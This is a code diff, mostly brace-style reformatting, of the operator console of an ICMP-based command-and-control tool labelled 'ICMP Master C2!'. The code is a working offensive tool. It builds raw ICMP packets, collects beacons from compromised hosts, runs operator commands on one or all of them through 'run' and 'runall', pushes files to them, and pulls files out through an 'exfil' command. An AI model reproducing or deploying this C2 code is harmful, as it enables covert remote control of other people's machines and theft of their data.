@@ -58,8 +58,7 @@ static uint16_t checksum(void *vdata, uint32_t size)
 
   // Handle any partial block at the start of the data.
   unsigned int offset = ((uintptr_t)data) & 3;
-  if (offset)
-  {
+  if (offset) {
     size_t count = 4 - offset;
     if (count > size)
       count = size;
@@ -72,8 +71,7 @@ static uint16_t checksum(void *vdata, uint32_t size)
 
   // Handle any complete 32-bit blocks.
   uint8_t *data_end = data + (size & ~3);
-  while (data != data_end)
-  {
+  while (data != data_end) {
     uint32_t word;
     memcpy(&word, data, 4);
     acc += ntohl(word);
@@ -82,8 +80,7 @@ static uint16_t checksum(void *vdata, uint32_t size)
   size &= 3;
 
   // Handle any partial block at the end of the data.
-  if (size)
-  {
+  if (size) {
     uint32_t word = 0;
     memcpy(&word, data, size);
     acc += ntohl(word);
@@ -91,15 +88,13 @@ static uint16_t checksum(void *vdata, uint32_t size)
 
   // Handle deferred carries.
   acc = (acc & 0xffffffff) + (acc >> 32);
-  while (acc >> 16)
-  {
+  while (acc >> 16) {
     acc = (acc & 0xffff) + (acc >> 16);
   }
 
   // If the data began at an odd byte address
   // then reverse the byte order to compensate.
-  if (offset & 1)
-  {
+  if (offset & 1) {
     acc = ((acc & 0xff00) >> 8) | ((acc & 0x00ff) << 8);
   }
 
@@ -117,8 +112,7 @@ std::vector<std::string> split_input(std::string &input)
 {
   std::vector<std::string> ret;
   std::istringstream iss(input);
-  for (std::string s; iss >> s;)
-  {
+  for (std::string s; iss >> s;) {
     ret.push_back(s);
   }
   return ret;
@@ -136,17 +130,16 @@ std::vector<std::string> split_input(std::string &input)
  */
 long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
-  uint8_t out[1024]; // outgoing buffer used to send ping
+  uint8_t out[1024];// outgoing buffer used to send ping
 
   icmphdr *icmp = (icmphdr *)out;
-  icmp->type = 0; // reply
+  icmp->type = 0;// reply
   icmp->code = 0;
   icmp->checksum = 0;
   icmp->un.echo.sequence++;
 
   // copy buffer to data section
-  if (buf && size > 0)
-  {
+  if (buf && size > 0) {
     memcpy(&out[sizeof(icmphdr)], buf, size);
   }
 
@@ -161,8 +154,7 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 
   // send data
   long ret;
-  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
-  {
+  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1) {
     perror("sendto");
   }
   return ret;
@@ -182,22 +174,18 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
 {
   long ret = 0;
   uint8_t in[1024];
-  if ((ret = read(sockfd, in, sizeof(in))) == -1)
-  {
+  if ((ret = read(sockfd, in, sizeof(in))) == -1) {
     return -1;
   }
 
   iphdr *ip = (iphdr *)in;
-  if (ret > sizeof(iphdr))
-  {
-    in_addr addr{ip->saddr};
+  if (ret > sizeof(iphdr)) {
+    in_addr addr{ ip->saddr };
     char *src_ = inet_ntoa(addr);
     src = src_;
 
-    if (ret > sizeof(iphdr) + sizeof(icmphdr))
-    {
-      if (buf && size > 0)
-      {
+    if (ret > sizeof(iphdr) + sizeof(icmphdr)) {
+      if (buf && size > 0) {
         memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), ret - sizeof(iphdr) - sizeof(icmphdr));
       }
     }
@@ -215,16 +203,14 @@ void listen_task()
 {
   // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-  if (sockfd == -1)
-  {
+  if (sockfd == -1) {
     perror("socket");
     std::exit(-1);
   }
 
   // create a buffer to store received data
   uint8_t in[1024];
-  while (1)
-  {
+  while (1) {
     // fill buffer with zeroes
     memset(in, 0, 1024);
 
@@ -232,15 +218,13 @@ void listen_task()
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
-    if (num_bytes > 0)
-    {
+    if (num_bytes > 0) {
       char *hostname_ = (char *)in;
       std::string hostname = hostname_;
 
       // only store hostname into active connections list if a beacon is sent
       auto split = split_input(hostname);
-      if (split.at(0).compare("(beacon)") == 0)
-      {
+      if (split.at(0).compare("(beacon)") == 0) {
         std::lock_guard<std::mutex> guard(active_connections_mutex);
         active_connections[split.at(1)] = src_ip;
       }
@@ -258,8 +242,7 @@ void send_command(const std::string &dst, const std::string &command)
 {
   // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-  if (sockfd == -1)
-  {
+  if (sockfd == -1) {
     perror("socket");
     exit(-1);
   }
@@ -272,10 +255,9 @@ void send_command(const std::string &dst, const std::string &command)
   send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
 
   // listen for response packets
-  while (1)
-  {
+  while (1) {
     uint8_t in[512];
-    
+
     // receive a ping and store the ip addres
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
@@ -283,22 +265,18 @@ void send_command(const std::string &dst, const std::string &command)
     if (dst != src_ip)
       continue;
 
-    if (num_bytes > 0)
-    {
+    if (num_bytes > 0) {
 
       char *str_ = (char *)in;
       std::string str(str_, num_bytes);
 
       // only store hostname into active connections list if a beacon is sent
       auto split = split_input(str);
-      if (split.at(0).compare("(beacon)") != 0)
-      {
+      if (split.at(0).compare("(beacon)") != 0) {
         // put command ouput to stdout
         std::fputs(str.c_str(), stdout);
       }
-    }
-    else
-    {
+    } else {
       break;
     }
   }
@@ -315,8 +293,7 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
 {
   // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-  if (sockfd == -1)
-  {
+  if (sockfd == -1) {
     perror("socket");
     exit(-1);
   }
@@ -331,16 +308,14 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
   // open file on machine to read
   FILE *fp = fopen(src_file.c_str(), "rb");
   uint8_t out[512];
-  if (fp == NULL)
-  {
+  if (fp == NULL) {
     perror("fopen");
     send_ping(sockfd, dst, NULL, 0);
     return;
   }
 
   size_t nbytes;
-  do
-  {
+  do {
     // send file 512 bytes at a time to the host
     nbytes = fread(out, 1, sizeof(out), fp);
     send_ping(sockfd, dst, out, nbytes);
@@ -360,8 +335,7 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
 {
   // open a socket
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-  if (sockfd == -1)
-  {
+  if (sockfd == -1) {
     perror("socket");
     exit(-1);
   }
@@ -375,14 +349,12 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
 
   // open file to be written to
   FILE *fp = fopen(dst_file.c_str(), "wb+");
-  if (fp == NULL)
-  {
+  if (fp == NULL) {
     perror("fopen");
     return;
   }
 
-  while (1)
-  {
+  while (1) {
     uint8_t in[512];
     // receive file 512 bytes at a time and write to file
     std::string src_ip;
@@ -391,21 +363,17 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
     if (dst != src_ip)
       continue;
 
-    if (num_bytes > 0)
-    {
+    if (num_bytes > 0) {
       char *str_ = (char *)in;
       std::string str(str_, num_bytes);
 
       // only store hostname into active connections list if a beacon is sent
       auto split = split_input(str);
-      if (split.at(0).compare("(beacon)") != 0)
-      {
+      if (split.at(0).compare("(beacon)") != 0) {
         // put command ouput to stdout
         fwrite(in, 1, num_bytes, fp);
       }
-    }
-    else
-    {
+    } else {
       fclose(fp);
       break;
     }
@@ -420,8 +388,7 @@ void receive_file(const std::string &dst, const std::string &src_file, const std
 void ping(const std::string &dst)
 {
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
-  if (sockfd == -1)
-  {
+  if (sockfd == -1) {
     perror("socket");
     exit(-1);
   }
@@ -438,12 +405,10 @@ void ping(const std::string &dst)
 void export_connections(const std::string &filename)
 {
   std::ofstream file(filename);
-  if (file.is_open())
-  {
+  if (file.is_open()) {
     std::lock_guard<std::mutex> guard(active_connections_mutex);
     auto it = active_connections.begin();
-    for (it; it != active_connections.end(); it++)
-    {
+    for (; it != active_connections.end(); it++) {
       file << it->first << " " << it->second << "\n";
     }
     file.close();
@@ -460,11 +425,9 @@ void export_connections(const std::string &filename)
 void load_connections(const std::string &filename)
 {
   std::ifstream file(filename);
-  if (file.is_open())
-  {
+  if (file.is_open()) {
     std::string host, ip;
-    while (file >> host >> ip)
-    {
+    while (file >> host >> ip) {
       hosts[host] = ip;
     }
     file.close();
@@ -479,7 +442,6 @@ void help()
   std::puts("ICMP Master C2!");
   std::puts("Current commands:");
   std::puts("\thelp: display this message");
-  std::puts("\tstart: begin listening for connections");
   std::puts("\tlist: list active connections");
   std::puts("\thosts: list all hosts");
   std::puts("\tset [host]: sets the cur host");
@@ -508,17 +470,19 @@ void help()
 int main(int argc, char **argv)
 {
   // load hosts from file
-  if (argc > 1)
-  {
+  if (argc > 1) {
     load_connections(argv[1]);
   }
 
   // display help message
   help();
 
+  std::puts("Starting listening thread.");
+  std::thread listen_thread(listen_task);
+  listen_thread.detach();
+
   // begin command loop
-  while (1)
-  {
+  while (1) {
     std::string input;
     std::cout << cur_host << " > ";
     std::getline(std::cin, input);
@@ -530,50 +494,28 @@ int main(int argc, char **argv)
     // split input by spaces and save into an vector
     auto input_arr = split_input(input);
 
-    if (input_arr.at(0).compare("help") == 0)
-    {
+    if (input_arr.at(0).compare("help") == 0) {
       help();
-    }
-    else if (input_arr.at(0).compare("start") == 0)
-    {
-      // starts the listening loop for beacons
-      if (listening)
-      {
-        std::puts("Already listening!");
-        continue;
-      }
-      std::thread listen_thread(listen_task);
-      listen_thread.detach();
-      listening = true;
-    }
-    else if (input_arr.at(0).compare("list") == 0)
-    {
+    } else if (input_arr.at(0).compare("list") == 0) {
       // lists active hosts
       std::puts("Listing active machines!");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
 
       auto it = active_connections.begin();
-      for (it; it != active_connections.end(); it++)
-      {
+      for (; it != active_connections.end(); it++) {
         std::cout << it->first << ": " << it->second << "\n";
       }
-    }
-    else if (input_arr.at(0).compare("hosts") == 0)
-    {
+    } else if (input_arr.at(0).compare("hosts") == 0) {
       // lists hosts that have been loaded from a file
       std::puts("Listing host machines!");
 
       auto it = hosts.begin();
-      for (it; it != hosts.end(); it++)
-      {
+      for (; it != hosts.end(); it++) {
         std::cout << it->first << ": " << it->second << "\n";
       }
-    }
-    else if (input_arr.at(0).compare("set") == 0) 
-    {
+    } else if (input_arr.at(0).compare("set") == 0) {
       // set host to execute commands
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: set [host]");
         continue;
       }
@@ -582,58 +524,44 @@ int main(int argc, char **argv)
         continue;
       }
       cur_host = input_arr.at(1);
-    }
-    else if (input_arr.at(0).compare("ping") == 0)
-    {
+    } else if (input_arr.at(0).compare("ping") == 0) {
       // ping an individual host by ip
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: ping [ip]");
         continue;
       }
       ping(input_arr.at(1));
       std::cout << "Sending ping to: " << input_arr.at(1) << "\n";
-    }
-    else if (input_arr.at(0).compare("pingh") == 0)
-    {
+    } else if (input_arr.at(0).compare("pingh") == 0) {
       // ping an individual host by hostname
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: pingh [host]");
         continue;
       }
       std::string ip = active_connections[input_arr.at(1)];
       ping(ip);
       std::cout << "Sending ping to: " << ip << "\n";
-    }
-    else if (input_arr.at(0).compare("beacon") == 0)
-    {
+    } else if (input_arr.at(0).compare("beacon") == 0) {
       // send a ping to all hosts in the host file
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
       auto it = hosts.begin();
-      for (it; it != hosts.end(); it++)
-      {
+      for (; it != hosts.end(); it++) {
         std::cout << "Beaconing: " << it->second << "\n";
         ping(it->second);
       }
-    }
-    else if (input_arr.at(0).compare("run") == 0)
-    {
+    } else if (input_arr.at(0).compare("run") == 0) {
       // run a command on a host by hostname
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: run [command]");
         continue;
       }
 
       std::string ip = active_connections[cur_host];
       std::string command;
-      for (int i = 1; i < input_arr.size(); i++)
-      {
+      for (int i = 1; i < input_arr.size(); i++) {
         command.append(input_arr.at(i));
-        if (i != input_arr.size() - 1)
-        {
+        if (i != input_arr.size() - 1) {
           command.append(" ");
         }
       }
@@ -642,41 +570,32 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_command(ip, command);
-    }
-    else if (input_arr.at(0).compare("runall") == 0)
-    {
+    } else if (input_arr.at(0).compare("runall") == 0) {
       // run a command on all hosts
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: runall [command]");
         continue;
       }
 
       std::string command;
-      for (int i = 1; i < input_arr.size(); i++)
-      {
+      for (int i = 1; i < input_arr.size(); i++) {
         command.append(input_arr.at(i));
-        if (i != input_arr.size() - 1)
-        {
+        if (i != input_arr.size() - 1) {
           command.append(" ");
         }
       }
 
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       auto it = active_connections.begin();
-      for (it; it != active_connections.end(); it++)
-      {
+      for (; it != active_connections.end(); it++) {
         std::cout << "Running command \"" << command << "\" on "
                   << it->second
                   << "\n";
         send_command(it->second, command);
       }
-    }
-    else if (input_arr.at(0).compare("file") == 0)
-    {
+    } else if (input_arr.at(0).compare("file") == 0) {
       // send a file over ICMP to host
-      if (input_arr.size() < 3)
-      {
+      if (input_arr.size() < 3) {
         std::puts("usage: file [src] [dst]");
         continue;
       }
@@ -686,12 +605,9 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_file(ip, input_arr.at(1), input_arr.at(2));
-    }
-    else if (input_arr.at(0).compare("exfil") == 0)
-    {
+    } else if (input_arr.at(0).compare("exfil") == 0) {
       // exfiltrate a file from a host
-      if (input_arr.size() < 3)
-      {
+      if (input_arr.size() < 3) {
         std::puts("usage: exfil [src] [dst]");
         continue;
       }
@@ -701,43 +617,31 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       receive_file(ip, input_arr.at(1), input_arr.at(2));
-    }
-    else if (input_arr.at(0).compare("export") == 0)
-    {
+    } else if (input_arr.at(0).compare("export") == 0) {
       // export currently connected hosts to a file
       std::string filename;
-      if (input_arr.size() > 1)
-      {
+      if (input_arr.size() > 1) {
         filename = input_arr.at(1);
-      }
-      else
-      {
+      } else {
         // default filename
         filename = "exported.txt";
       }
       std::cout << "Exporting to: " << filename << "\n";
       export_connections(filename);
-    }
-    else if (input_arr.at(0).compare("load") == 0)
-    {
+    } else if (input_arr.at(0).compare("load") == 0) {
       // load a host config from a filename
-      if (input_arr.size() < 2)
-      {
+      if (input_arr.size() < 2) {
         std::puts("usage: load [filename]");
         continue;
       }
       std::cout << "Loading from: " << input_arr.at(1) << "\n";
       load_connections(input_arr.at(1));
-    }
-    else if (input_arr.at(0).compare("clear") == 0)
-    {
+    } else if (input_arr.at(0).compare("clear") == 0) {
       // clear the currently connected hosts
       std::puts("Clearing active connections");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
       active_connections.clear();
-    }
-    else if (input_arr.at(0).compare("exit") == 0)
-    {
+    } else if (input_arr.at(0).compare("exit") == 0) {
       break;
     }
   }
